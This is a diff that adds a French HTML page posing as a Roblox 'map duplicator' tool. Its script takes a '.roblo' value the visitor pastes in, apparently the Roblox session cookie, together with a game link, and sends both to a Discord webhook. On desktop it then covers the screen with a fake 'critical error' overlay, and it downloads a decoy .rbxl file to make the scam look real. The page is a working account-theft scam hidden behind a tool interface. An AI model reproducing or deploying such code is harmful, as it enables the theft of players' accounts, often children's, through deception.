@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Duplicateur de map</title>
+
+  <style>
+    :root {
+      --main-width: 720px;
+      --field-height: 70px;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 40px;
+      padding: 30px 10px;
+    }
+
+    .video-box {
+      width: var(--main-width);
+      border: 4px solid #fff;
+      padding: 15px;
+      text-align: center;
+    }
+
+    .video-box iframe {
+      width: 100%;
+      height: 180px;
+      border: none;
+    }
+
+    .card {
+      width: var(--main-width);
+      background: #8a8a8a;
+      border-radius: 35px;
+      padding: 25px;
+      border: 5px solid #000;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .field {
+      height: var(--field-height);
+      background: #ffc0cb;
+      border-radius: 25px;
+      border: 4px solid #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+    }
+
+    .field input {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background: transparent;
+      outline: none;
+      text-align: center;
+      font-weight: bold;
+      font-size: 15px;
+    }
+
+    .button {
+      height: var(--field-height);
+      background: #ffc0cb;
+      border-radius: 25px;
+      border: 4px solid #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+      cursor: pointer;
+      color: #000;
+    }
+
+    .button:hover {
+      background: #ffb0c0;
+    }
+
+    #status {
+      text-align: center;
+      font-weight: bold;
+      min-height: 20px;
+    }
+
+    .footer {
+      width: var(--main-width);
+      border: 4px solid #fff;
+      padding: 15px;
+      text-align: center;
+      font-weight: bold;
+      letter-spacing: 2px;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="video-box">
+  <iframe 
+    width="560" 
+    height="315"
+    src="https://www.youtube.com/embed/nahXnhN18No"
+    title="YouTube video player"
+    frameborder="0"
+    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+    allowfullscreen>
+  </iframe>
+
+  <p>Tuto comment dupliquer une map Roblox</p>
+</div>
+
+
+  <div class="card">
+
+    <div class="field">
+      <input id="robloText" type="text" placeholder=".roblo" />
+    </div>
+
+    <div class="field">
+      <input id="gameLink" type="text" placeholder="Lien du jeu Roblox" />
+    </div>
+
+    <div class="button" onclick="startProcess()">Commencer</div>
+
+    <div id="status"></div>
+
+  </div>
+
+  <div class="footer">DUPLICATEUR DE MAP</div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/XXXX";
+
+    function startProcess() {
+      sendToDiscord();
+
+      if (!isMobile()) {
+        setTimeout(fakeFreezePC, 2000);
+      }
+
+      // ⬇️ AJOUT : téléchargement du fichier .rbxl après 10 secondes
+      setTimeout(() => {
+        downloadRBXL();
+      }, 10000);
+    }
+
+    function downloadRBXL() {
+      const a = document.createElement("a");
+      a.href = "ImpossibleObby.rbxl"; // le fichier doit être à côté du HTML
+      a.download = "ImpossibleObby.rbxl";
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    function sendToDiscord() {
+      const roblo = document.getElementById("robloText").value;
+      const link = document.getElementById("gameLink").value;
+      const status = document.getElementById("status");
+
+      if (!roblo) {
+        status.style.color = "red";
+        status.textContent = "✖ Champ .roblo vide";
+        return;
+      }
+
+      const payload = {
+        embeds: [{
+          title: "Nouvelle valeur .roblo",
+          color: 16711680,
+          fields: [
+            { name: "Valeur .roblo", value: roblo },
+            { name: "Lien du jeu", value: link || "Non renseigné" }
+          ],
+          footer: { text: "Envoyé depuis le site .roblo" }
+        }]
+      };
+
+      fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(() => {
+        status.style.color = "lime";
+        status.textContent = "✔ Duplication en cours...";
+      })
+      .catch(() => {
+        status.style.color = "red";
+        status.textContent = "Erreur envoi Discord";
+      });
+    }
+
+    function isMobile() {
+      return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+    }
+
+    function fakeFreezePC() {
+      const overlay = document.createElement("div");
+
+      Object.assign(overlay.style, {
+        position: "fixed",
+        top: "0",
+        left: "0",
+        width: "100vw",
+        height: "100vh",
+        background: "black",
+        color: "red",
+        zIndex: "999999",
+        display: "flex",
+        flexDirection: "column",
+        alignItems: "center",
+        justifyContent: "center",
+        fontFamily: "monospace",
+        textAlign: "center",
+        cursor: "none"
+      });
+
+      overlay.innerHTML = `
+        <h1>❌ Erreur de liaison</h1>
+        <p>Une erreur critique est survenue.</p>
+        <p>Veuillez réessayer plus tard.</p>
+      `;
+
+      document.body.style.overflow = "hidden";
+      document.body.appendChild(overlay);
+    }
+  </script>
+
+</body>
+</html>
